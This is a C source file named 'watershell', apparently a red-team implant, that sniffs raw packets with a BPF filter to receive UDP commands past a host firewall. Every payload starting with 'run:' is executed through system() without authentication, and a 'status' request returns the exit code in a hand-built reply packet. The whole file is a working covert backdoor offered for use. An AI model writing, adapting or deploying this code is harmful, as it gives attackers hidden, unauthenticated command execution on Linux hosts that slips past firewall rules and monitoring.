/*
 * =====================================================================================
 *
 *       Filename:  watershell.c
 *
 *    Description:  run commands through a firewall... yeeaaa
 *
 *        Version:  1.0
 *        Created:  07/01/2015 09:10:41 AM
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  Jaime Geiger, jmg2967@rit.edu
 *
 * =====================================================================================
 */

#include <net/if.h>
#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/filter.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <signal.h>
#include <stdbool.h>

#define IFACE "eth0"
#define PORT 12345
#define PROMISC false

struct sock_filter bpf_code[] = {
    { 0x28, 0, 0, 0x0000000c },
    { 0x15, 0, 6, 0x000086dd },
    { 0x30, 0, 0, 0x00000014 },
    { 0x15, 0, 15, 0x00000011 },
    { 0x28, 0, 0, 0x00000036 },
    { 0x15, 12, 0, 0x00003039 }, //5
    { 0x28, 0, 0, 0x00000038 },
    { 0x15, 10, 11, 0x00003039 }, //7
    { 0x15, 0, 10, 0x00000800 },
    { 0x30, 0, 0, 0x00000017 },
    { 0x15, 0, 8, 0x00000011 },
    { 0x28, 0, 0, 0x00000014 },
    { 0x45, 6, 0, 0x00001fff },
    { 0xb1, 0, 0, 0x0000000e },
    { 0x48, 0, 0, 0x0000000e },
    { 0x15, 2, 0, 0x00003039 }, //15
    { 0x48, 0, 0, 0x00000010 },
    { 0x15, 0, 1, 0x00003039 }, //17
    { 0x6, 0, 0, 0x0000ffff },
    { 0x6, 0, 0, 0x00000000 },
};

void send_status(unsigned char *buf, int code);
void sigint(int signum);
void ip_checksum(struct iphdr *ip);
void udp_checksum(struct iphdr *ip, unsigned short *payload);

int sockfd;
struct ifreq *sifreq;
bool promisc;

int main(int argc, char *argv[])
{
    int i, n, hlen, arg;
    struct sock_fprog filter;
    char buf[2048];
    unsigned char *read;
    char *udpdata, *iface = IFACE;
    struct iphdr *ip;
    struct udphdr *udp;
    unsigned port = PORT;
    int code = 0;

    promisc = PROMISC;

    while ((arg = getopt(argc, argv, "phi:l:")) != -1){
        switch (arg){
            case 'i':
                iface = optarg;
                break;
            case 'p':
                puts("Running in promisc mode");
                promisc = true;
                break;
            case 'h':
                fprintf(stderr, "Usage: %s [-l port] [-p] -i iface\n", argv[0]);
                return 0;
                break;
            case 'l':
                port += strtoul(optarg, NULL, 10);
                if (port <= 0 || port > 65535){
                    puts("Invalid port");
                    return 1;
                }
                break;
            case '?':
                fprintf(stderr, "Usage: %s [-l port] [-p] -i iface\n", argv[0]);
                return 1;
            default:
                abort();
        }
    }

    bpf_code[5].k = port;
    bpf_code[7].k = port;
    bpf_code[15].k = port;
    bpf_code[17].k = port;

    sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP));
    if (sockfd < 0){
        perror("socket");
        return 1;
    }

    sifreq = malloc(sizeof(struct ifreq));
    signal(SIGINT, sigint);
    strncpy(sifreq->ifr_name, iface, IFNAMSIZ);
    if (ioctl(sockfd, SIOCGIFFLAGS, sifreq) == -1){
        perror("ioctl GIFFLAGS");
        close(sockfd);
        free(sifreq);
        return 0;
    }

    if (promisc){
        sifreq->ifr_flags |= IFF_PROMISC;
        if (ioctl(sockfd, SIOCSIFFLAGS, sifreq) == -1){
            perror("ioctl SIFFLAGS");
        }
    }

    filter.len = 20;
    filter.filter = bpf_code;
    if (setsockopt(sockfd, SOL_SOCKET, SO_ATTACH_FILTER,
                   &filter, sizeof(filter)) < 0){
        perror("setsockopt");
    }

    for (;;){
        memset(buf, 0, 2048);
        n = recvfrom(sockfd, buf, 2048, 0, NULL, NULL);
        ip = (struct iphdr *)(buf + sizeof(struct ethhdr));
        udp = (struct udphdr *)(buf + ip->ihl*4 + sizeof(struct ethhdr));
        udpdata = (char *)((buf + ip->ihl*4 + 8 + sizeof(struct ethhdr)));
        if (*udpdata != 0)
            printf("%s\n", udpdata);
        if (!strncmp(udpdata, "run:", 4))
            code = system(udpdata + 4);
        if(!strncmp(udpdata, "status", 6))
            send_status(buf, code);
    }

    return 0;
}

void sigint(int signum){
    if (promisc){
        if (ioctl(sockfd, SIOCGIFFLAGS, sifreq) == -1){
            perror("ioctl GIFFLAGS");
        }
        sifreq->ifr_flags ^= IFF_PROMISC;
        if (ioctl(sockfd, SIOCSIFFLAGS, sifreq) == -1){
            perror("ioctl SIFFLAGS");
        }
    }
    free(sifreq);
    close(sockfd);
    exit(1);
}

struct __attribute__((__packed__)) udpframe {
    struct ethhdr ehdr;
    struct iphdr ip;
    struct udphdr udp;
    unsigned char data[ETH_DATA_LEN - sizeof(struct udphdr) - sizeof(struct iphdr)];
};

void send_status(unsigned char *buf, int code){
    struct udpframe frame;
    struct sockaddr_ll saddrll;
    struct sockaddr_in sin;
    int len = snprintf(NULL, 0, "%d", code);
    char *prefix = "LISTENING: ";
    char *ccode = (char*)calloc(1, len+1);
    char *data = calloc(1, strlen(prefix)+len+2);
    snprintf(ccode, len+1, "%d", code);
    strncpy(data, prefix, strlen(prefix));
    strncat(data, ccode, len+1);
    strncat(data, "\n", 1);
    memset(&frame, 0, sizeof(frame));
    if (ioctl(sockfd, SIOCGIFINDEX, sifreq) == -1){
        perror("GIFINDEX");
        return;
    }
    saddrll.sll_family = PF_PACKET;
    saddrll.sll_ifindex = sifreq->ifr_ifindex;
    saddrll.sll_halen = ETH_ALEN;
    memcpy((void*)saddrll.sll_addr, (void*)(((struct ethhdr*)buf)->h_source), ETH_ALEN);
    memcpy((void*)frame.ehdr.h_source, (void*)(((struct ethhdr*)buf)->h_dest), ETH_ALEN);
    memcpy((void*)frame.ehdr.h_dest, (void*)(((struct ethhdr*)buf)->h_source), ETH_ALEN);
    frame.ehdr.h_proto = htons(ETH_P_IP);
    frame.ip.version = 4;
    frame.ip.ihl = sizeof(frame.ip)/4;
    frame.ip.id = htons(69);
    frame.ip.frag_off |= htons(IP_DF);
    frame.ip.ttl = 64;
    frame.ip.tos = 0;
    frame.ip.tot_len = htons(sizeof(frame.ip) + sizeof(frame.udp) + strlen(data));
    frame.ip.saddr = ((struct iphdr*)(buf+sizeof(struct ethhdr)))->daddr;
    frame.ip.daddr = ((struct iphdr*)(buf+sizeof(struct ethhdr)))->saddr;
    frame.ip.protocol = IPPROTO_UDP;
    frame.udp.source = ((struct udphdr*)(buf+sizeof(struct ethhdr)+sizeof(struct iphdr)))->dest;
    frame.udp.dest = ((struct udphdr*)(buf+sizeof(struct ethhdr)+sizeof(struct iphdr)))->source;
    frame.udp.len = htons(strlen(data) + sizeof(frame.udp));
    //udp_checksum(&frame.ip, (unsigned short*)&frame.udp);
    ip_checksum(&frame.ip);
    strncpy(frame.data, data, strlen(data));
    len = sizeof(struct ethhdr) + sizeof(struct udphdr) + sizeof(struct iphdr) + strlen(data);
    sendto(sockfd, (char*)&frame, len, 0, (struct sockaddr *)&saddrll, sizeof(saddrll));
    free(ccode);
    free(data);
}

//broken?
void udp_checksum(struct iphdr *ip, unsigned short *payload){
    register unsigned long sum = 0;
    struct udphdr *udp = (struct udphdr*)payload;
    unsigned short len = udp->len;
    unsigned short *addr = (short*)ip;
    udp->check = 0;
    sum += (ip->daddr>>16) & 0xFFFF;
    sum += (ip->daddr) & 0xFFFF;
    sum += htons(IPPROTO_UDP);
    sum += ntohs(udp->len);
    while (len > 1){
        sum += *addr++;
        len -= 2;
    }
    if (len > 0)
        sum += ((*addr) & htons(0xFFFF));
    while (sum>>16)
        sum = (sum & 0xFFFF) + (sum >>16);
    sum = ~sum;
    udp->check = ((unsigned short)sum == 0x0000) ? 0xFFFF : (unsigned short)sum;
}


void ip_checksum(struct iphdr *ip){
    unsigned int count = ip->ihl<<2;
    unsigned short *addr = (short*)ip;
    register unsigned long sum = 0;

    ip->check = 0;
    while (count > 1){
        sum += *addr++;
        count -= 2;
    }
    if (count > 0)
        sum += ((*addr) & htons(0xFFFF));
    while (sum>>16)
        sum = (sum & 0xFFFF) + (sum >>16);
    sum = ~sum;
    ip->check = (unsigned short)sum;
}
